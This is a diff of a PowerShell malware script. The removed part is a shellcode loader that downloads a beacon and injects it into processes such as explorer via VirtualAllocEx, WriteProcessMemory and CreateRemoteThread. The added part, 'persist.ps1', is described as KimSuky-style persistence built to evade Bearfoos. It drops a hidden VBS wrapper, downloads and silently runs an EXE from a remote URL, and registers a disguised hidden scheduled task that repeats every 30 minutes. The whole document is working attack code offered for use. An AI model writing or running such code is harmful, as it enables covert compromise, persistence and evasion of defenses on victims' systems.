@@ -1,18 +1,58 @@
-if ($PSVersionTable.PSVersion.Major -gt 2) {
-    powershell.exe -Version 2 -NoProfile -ExecutionPolicy Bypass -File "$($MyInvocation.MyCommand.Path)"
-    exit
+# persist.ps1 - KimSuky-style robust persistence, fuck Bearfoos on second reboot
+$ErrorActionPreference = 'SilentlyContinue'
+
+# Random folder in %TEMP% to blend in
+$randFolder = [System.IO.Path]::GetRandomFileName()
+$persistDir = "$env:TEMP\$randFolder"
+New-Item -ItemType Directory -Path $persistDir -Force | Out-Null
+
+$vbsPath = "$persistDir\update.vbs"
+$psPath  = "$persistDir\sync.ps1"
+$taskName = "Windows Cache Updater Task S-1-12-12-3-$(Get-Random -Min 100000000 -Max 999999999)BVSKLERh-SD$(Get-Random -Min 100 -Max 999)"
+
+# VBS wrapper (runs PS hidden, parent = wscript.exe)
+$vbsContent = @"
+Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""$psPath""", 0, False
+"@
+$vbsContent | Out-File -FilePath $vbsPath -Encoding ASCII -Force
+
+# The real persistent payload downloader/launcher
+$psContent = @"
+`$ErrorActionPreference = 'SilentlyContinue'
+Start-Sleep -Milliseconds (Get-Random -Min 2000 -Max 8000)
+
+`$cache = "`$env:APPDATA\Microsoft\Windows\Caches"
+if (-not (Test-Path `$cache)) { New-Item -ItemType Directory -Path `$cache -Force | Out-Null }
+
+`$exeUrl = 'https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/main/assets/EdgeUpdater.exe'  # your base64 one or direct
+`$exePath = "`$cache\helper.exe"
+
+if (-not (Test-Path `$exePath) -or ((Get-Item `$exePath).Length -lt 100KB)) {
+    try {
+        Invoke-WebRequest -Uri `$exeUrl -OutFile `$exePath -Headers @{'User-Agent'='Mozilla/5.0'} -UseBasicParsing
+    } catch {}
 }
 
-$encodedCSharp = "W3VzaW5nIFN5c3RlbTsgdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOyBwdWJsaWMgY2xhc3MgVXRpbCB7IFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXSBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgVmlydHVhbEFsbG9jRXgoSW50UHRyIGhQcm9jZXNzLCBJbnRQdHIgbHBBZGRyZXNzLCB1aW50IGR3U2l6ZSwgdWludCBmbEFsbG9jYXRpb25UeXBlLCB1aW50IGZsUHJvdGVjdCk7IFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXSBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIFdyaXRlUHJvY2Vzc01lbW9yeShJbnRQdHIgaFByb2Nlc3MsIEludFB0ciBscEJhc2VBZGRyZXNzLCBieXRlW10gbHBCdWZmZXIsIHVpbnQgblNpemUsIG91dCBJbnRQdHIgbHBOdW1iZXJPZkJ5dGVzV3JpdHRlbik7IFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXSBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgQ3JlYXRlUmVtb3RlVGhyZWFkKEludFB0ciBoUHJvY2VzcywgSW50UHRyIGxwVGhyZWFkQXR0cmlidXRlcywgdWludCBkd1N0YWNrU2l6ZSwgSW50UHRyIGxwU3RhcnRBZGRyZXNzLCBJbnRQdHIgbHBQYXJhbWV0ZXIsIHVpbnQgZHdDcmVhdGlvbkZsYWdzLCBJbnRQdHIgbHBUaHJlYWRJZCk7IH0="
-$csharpCode = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encodedCSharp))
-Add-Type $csharpCode
+# Launch via WScript again for clean parent
+try {
+    `$wsh = New-Object -ComObject WScript.Shell
+    `$wsh.Run("`"`$exePath`"", 0, `$false)
+} catch {
+    Start-Process `$exePath -WindowStyle Hidden
+}
 
-$shellcodeUrl = "https://your-server.com/beacon.bin"
-$shellcode = (New-Object Net.WebClient).DownloadData($shellcodeUrl)
+# Optional: delete old copies after launch
+Start-Sleep -Seconds 60
+Get-ChildItem `$cache -Filter "*.exe" -Exclude "helper.exe" | Remove-Item -Force -ErrorAction SilentlyContinue
+"@
+$psContent | Out-File -FilePath $psPath -Encoding UTF8 -Force
 
-$target = Get-Process -Name explorer, svchost, notepad -ErrorAction SilentlyContinue | Select-Object -First 1
-$hProcess = [Util]::OpenProcess(0x1F0FFF, $false, $target.Id)
+# Create the scheduled task (KimSuky exact style)
+$action = New-ScheduledTaskAction -Execute 'wscript.exe' -Argument "`"$vbsPath`""
+$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(5) -RepetitionInterval (New-TimeSpan -Minutes 30)
+$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Minutes 0)
+Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
 
-$addr = [Util]::VirtualAllocEx($hProcess, 0, $shellcode.Length, 0x1000, 0x40)
-[Util]::WriteProcessMemory($hProcess, $addr, $shellcode, $shellcode.Length, [ref]$null)
-[Util]::CreateRemoteThread($hProcess, 0, 0, $addr, 0, 0, [ref]$null)
+# Optional: run it immediately for testing
+Start-Process wscript.exe -ArgumentList $vbsPath -WindowStyle Hidden
